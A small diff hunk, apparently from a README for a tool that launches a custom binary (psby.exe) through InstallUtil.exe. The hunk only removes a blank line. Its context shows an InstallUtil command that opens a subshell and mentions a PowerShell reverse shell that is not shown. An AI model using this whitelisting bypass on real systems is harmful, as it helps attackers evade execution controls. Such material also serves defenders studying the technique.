@@ -15,7 +15,6 @@ Besides, your binary doesn't have to be an "exe" as InstallUtil.exe parse any fi
 This one opens a subshell in the current console:
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
-
 ```
 
 This one tries to open a PS reverse shell (I've bound it into the source as a life saver :-)):
